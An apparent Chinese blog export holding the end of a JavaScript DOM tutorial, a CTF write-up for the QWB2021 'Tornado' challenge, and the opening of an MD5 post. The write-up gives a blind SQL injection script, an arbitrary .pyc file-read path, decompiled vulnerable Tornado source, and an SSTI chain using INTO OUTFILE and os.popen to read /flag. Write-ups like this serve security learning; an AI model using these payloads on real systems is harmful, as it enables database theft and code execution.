

<h4 id="MATH对象"><a href="#MATH对象" class="headerlink" title="MATH对象"></a>MATH对象</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">例： <span class="module-access"><span class="module"><span class="identifier">Math</span>.</span></span>round(<span class="number">2.5</span>)    <span class="comment">//得到3  把数四舍五入为最接近的整数。</span></span><br></pre></td></tr></table></figure>


<h4 id="DOM对象控制HTML"><a href="#DOM对象控制HTML" class="headerlink" title="DOM对象控制HTML"></a>DOM对象控制HTML</h4><p>​    1.方法：</p>
<p>​      getElementsByName()  获取name</p>
<p>​      getElementsByTagName()  获取元素</p>
<p>​      getAttribute()  获取元素属性</p>
<p>​      setAttribute()  设置元素属性</p>
<p>​      childNodes()  访问子节点</p>
<p>​      parentNode()  访问父节点</p>
<p>​      createElement()  创建元素节点</p>
<p>​      createTextNode()  创建文本节点</p>
<p>​      insertBefore()  插入节点</p>
<p>​      removeChild()  删除节点</p>
<p>​      offsetHeight()  网页尺寸</p>
<p>​      scrollHeight()  网页尺寸  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">		&lt;title&gt;&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;p name=<span class="string">&quot;pn&quot;</span>&gt;Hello&lt;/p&gt;</span><br><span class="line">		&lt;p name=<span class="string">&quot;pn&quot;</span>&gt;Hello&lt;/p&gt;</span><br><span class="line">		&lt;p name=<span class="string">&quot;pn&quot;</span>&gt;Hello&lt;/p&gt;</span><br><span class="line">		&lt;p name=<span class="string">&quot;pn&quot;</span>&gt;Hello&lt;/p&gt;</span><br><span class="line">		&lt;a id=<span class="string">&quot;aid&quot;</span> title=<span class="string">&quot;得到了A标签的属性&quot;</span>&gt;Hello&lt;/a&gt;</span><br><span class="line">		&lt;a id=<span class="string">&quot;aid2&quot;</span>&gt;aid2&lt;/a&gt;</span><br><span class="line">		&lt;ul&gt;</span><br><span class="line">			&lt;li&gt;<span class="number">1</span>&lt;/li&gt;</span><br><span class="line">			&lt;li&gt;<span class="number">2</span>&lt;/li&gt;</span><br><span class="line">			&lt;li&gt;<span class="number">3</span>&lt;/li&gt;</span><br><span class="line">		&lt;/ul&gt;</span><br><span class="line">		&lt;div id=<span class="string">&quot;div&quot;</span>&gt;</span><br><span class="line">			&lt;p id=<span class="string">&quot;pid&quot;</span>&gt;div的p元素&lt;/p&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;script&gt;</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> count = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">				alert(count.length);</span><br><span class="line">				<span class="keyword">var</span> p = count[<span class="number">0</span>];</span><br><span class="line">				p.innerHTML = <span class="string">&quot;World&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> anode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;aid&quot;</span>);</span><br><span class="line">				<span class="keyword">var</span> attr = anode.getAttribute(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">				alert(attr);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">setAttr</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> anode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;aid2&quot;</span>);</span><br><span class="line">				anode.setAttribute(<span class="string">&quot;title&quot;</span>,<span class="string">&quot;动态设置a的title属性&quot;</span>);</span><br><span class="line">				<span class="keyword">var</span> attr = anode.getAttribute(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">				alert(attr);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">getChildNode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> childnode = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;ul&quot;</span>)[<span class="number">0</span>].childNodes;</span><br><span class="line">				alert(childnode.length);	</span><br><span class="line">				alert(childnode[<span class="number">0</span>].nodeType);</span><br><span class="line">				alert(childnode[<span class="number">1</span>].nodeType);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">getParentNode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pid&quot;</span>);</span><br><span class="line">				alert(div.parentNode.nodeName);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">createNode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> body = <span class="built_in">document</span>.body;</span><br><span class="line">				<span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">				input.type = <span class="string">&quot;button&quot;</span>;</span><br><span class="line">				input.value = <span class="string">&quot;按钮&quot;</span>;</span><br><span class="line">				body.appendChild(input);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">addNode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">				<span class="keyword">var</span> node = <span class="built_in">document</span>.getElementById(<span class="string">&quot;pid&quot;</span>);</span><br><span class="line">				<span class="keyword">var</span> newNode = <span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">				newNode.innerHTML = <span class="string">&quot;动态添加第一个p元素&quot;</span>;</span><br><span class="line">				div.insertBefore(newNode,node);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">removeNode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">				<span class="keyword">var</span> p = div.removeChild(div.childNodes[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="title">getSize</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">				<span class="keyword">var</span> width = <span class="built_in">document</span>.body.offsetWidth||<span class="built_in">document</span>.documentElement.offsetWidth;</span><br><span class="line">				<span class="keyword">var</span> height = <span class="built_in">document</span>.body.offsetHeight||<span class="built_in">document</span>.documentElement.offsetHeight;</span><br><span class="line">				alert(width+<span class="string">&quot;,&quot;</span>+height);</span><br><span class="line">			&#125;</span><br><span class="line">			getSize();</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>QWB2021 Quals 托纳多</title>
    <url>/2021/07/23/QWB2021-Quals-%E6%89%98%E7%BA%B3%E5%A4%9A/</url>
    <content><![CDATA[<p>强网杯2021-托纳多复现<a id="more"></a></p>
<h2 id="sql注入获取admin账号密码"><a href="#sql注入获取admin账号密码" class="headerlink" title="sql注入获取admin账号密码"></a>sql注入获取admin账号密码</h2><p><strong>利用<code>processlist</code>表读取正在执行的sql语句，从而得到表名与列名</strong></p>
<img src="http://img.npfs06.top/20210723105353.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9ea19d02-b943-4a06-9d06-ee9e316803a0.node4.buuoj.cn/&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">300</span>):</span><br><span class="line">        <span class="comment"># payload = &quot;if((ascii(substr((select (info)  FROM information_schema.processlist limit 0,1),&quot; + str( n + 1) + &quot;,1)) in (&quot; + str(i) + &quot;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment">#SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;andmin&#x27;</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select qwbqwbqwbpass FROM qwbtttaaab111e limit 0,1),&quot;</span> + <span class="built_in">str</span>(n + <span class="number">1</span>) + <span class="string">&quot;,1)) in (&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)),1,0)&quot;</span></span><br><span class="line">        <span class="comment">#glzjin666888</span></span><br><span class="line">        r = requests.get(url + <span class="string">&quot;register.php?username=admin&#x27; and &quot;</span> + payload + <span class="string">&quot; and &#x27;1&amp;password=1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;username&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(<span class="built_in">chr</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(<span class="string">&quot;success&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            print(<span class="string">&quot;n= &quot;</span>+<span class="built_in">str</span>(n)+<span class="string">&quot; i= &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;|&quot;</span>+r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment">#glzjin666888</span></span><br></pre></td></tr></table></figure>
<h2 id="os-path-join任意文件读取"><a href="#os-path-join任意文件读取" class="headerlink" title="os.path.join任意文件读取"></a>os.path.join任意文件读取</h2><p>得到密码后，登入即可，但是在buu发现，无法以admin身份登录，所以这一步只能跳过了</p>
<p>预期解登入后，会看到一个图片，通过图片接口可有任意文件读取</p>
<p>然后读/proc/self/cmdline</p>
<p>可以得到python应用运行路径 python3 /qwb/app/app.py<br>读app.py和flag不允许，但是python有个pyc文件，</p>
<p>pyc文件是有一定的命名规则的，既然我们得知了app.py的目录，我们就可以去该目录寻找pyc文件。pyc的命名规则为<code>__pycache__/文件名.cpython-2位版本号.pyc</code>，这里文件名为app，版本号需要爆破一下，其实如果你留心的话，本服务器在http返回头中返回了tornado版本号（tornado默认返回的）为<code>Server: TornadoServer/6.0.3</code>，而该版本的tornado只支持python3.5及其以上版本，因此这里只需要随便猜几次就猜到python版本号了。最终payload为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/qwbimage.php?qwb_image_name=/</span>qwb<span class="regexp">/app/</span>__pycache__/app.cpython-<span class="number">35</span>.pyc</span><br></pre></td></tr></table></figure>
<p>反编译后得到源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re</span><br><span class="line">settings = &#123;<span class="string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;</span><br><span class="line">db_username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">db_password = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>) == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(<span class="string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    self.set_secure_cookie(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.finish(<span class="string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cursor.close()</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        word_bans = [<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;inno&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>]</span><br><span class="line">        bans = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> word_bans:</span><br><span class="line">            <span class="keyword">if</span> re.search(ban, username, re.IGNORECASE):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> username:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.rollback()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogoutHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.clear_all_cookies()</span><br><span class="line">        self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/index.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        image_name = self.get_argument(<span class="string">&#x27;qwb_image_name&#x27;</span>, <span class="string">&#x27;header.jpeg&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> image_name:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> image_name.endswith(<span class="string">&#x27;.py&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> image_name <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> image_name:</span><br><span class="line">                self.finish(<span class="string">&quot;nonono, you can&#x27;t read it.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            image_name = os.path.join(os.getcwd() + <span class="string">&#x27;/image&#x27;</span>, image_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                img = f.read()</span><br><span class="line">            self.set_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">            self.finish(img)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tornado.web.RequestHandler._template_loaders):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line">        msg = self.get_argument(<span class="string">&#x27;congratulations&#x27;</span>, <span class="string">&#x27;oh! you find it&#x27;</span>)</span><br><span class="line">        bans = []</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> msg:</span><br><span class="line">                self.finish(<span class="string">&#x27;bad hack,go out!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;congratulations.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">            f.write(<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)</span><br><span class="line">            f.flush()</span><br><span class="line">        self.render(<span class="string">&#x27;congratulations.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line">                </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/index.php&#x27;</span>, MainHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/login.php&#x27;</span>, LoginHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/logout.php&#x27;</span>, LogoutHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/register.php&#x27;</span>, RegisterHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/admin.php&#x27;</span>, AdminHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>, MainHandler)], **settings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    print(<span class="string">&#x27;start&#x27;</span>)</span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210723155111.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<p>在<code>/good_job_my_ctfer.php</code>路由对应的处理部分，有个ssti，但过滤的很死。因为<code>&#123;&#123;&#125;&#125;</code>被过滤，所以只能用<code>&#123;%%&#125;\` 这一步用到的为**&#123;%extends %&#125;**，它的参数为一个文件，会将其包含并渲染。所以思路为上传一个文件，然后extends包含并渲染。这里通过register向服务器写入文件。具体实现为通过注册功能将代码写入数据库，再通过</code>into outfile<code>语句将其导出为文件。导出文件路径为</code>/var/lib/mysql-files/`，因为mysql只在这里有写的权限。</p>
<p>exp</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/register.php?username=npfs&amp;password=&#123;% <span class="keyword">set</span> return <span class="comment">__import__(</span><span class="comment">&quot;os&quot;</span><span class="comment">).popen(</span><span class="comment">&quot;cat  /flag&quot;</span><span class="comment">).read()%&#125;</span></span><br><span class="line">/register.php?username=npfs<span class="comment">&#x27; into outfile &#x27;</span>/var/lib/mysql-files/npfs&amp;password=npfs</span><br><span class="line">/good_job_my_ctfer.php?congratulations=&#123;% extends /var/<span class="comment">lib</span>/mysql-<span class="keyword">files</span>/<span class="comment">npfs%&#125;</span></span><br></pre></td></tr></table></figure>


<p>参考链接：<a href="https://www.anquanke.com/post/id/244153#h2-4">https://www.anquanke.com/post/id/244153#h2-4</a></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>MD5相关</title>
    <url>/2021/02/19/MD5%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<p><strong>string强等于</strong></p>
<a id="more"></a>

